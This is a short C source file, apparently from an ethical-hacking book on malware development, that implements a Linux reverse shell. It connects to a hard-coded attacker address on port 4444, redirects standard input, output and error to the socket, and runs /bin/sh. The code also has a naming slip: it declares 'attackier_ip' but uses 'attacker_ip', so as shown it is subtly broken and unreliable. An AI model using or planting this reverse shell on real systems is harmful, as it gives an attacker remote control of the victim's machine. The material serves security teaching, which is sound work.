/*
 * Malware Development for Ethical Hackers
 * hack.c
 * Basic reverse shell implementation for Linux systems
 * Typical malicious software illustration
 * created by: @cocomelonc
 * copyright: PacktPub
*/
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main(){
    const char* attackier_ip = "10.9.1.6";

    struct sockaddr_in target_address;
    target_address.sin_family = AF_INET;
    target_address.sin_port = htons(4444);
    inet_aton(attacker_ip, &target_address.sin_addr);

    int socket_file_descriptor = socket(AF_INET, SOCK_STREAM, 0);

    connect(socket_file_descriptor, (struct sockaddr *)&target_address, sizeof(target_address));

    for (int index = 0; index < 3; index++) {
       dup2(socket_file_descriptor, index);
    }
   
    execve("/bin/sh", NULL, NULL);
    return 0;

}
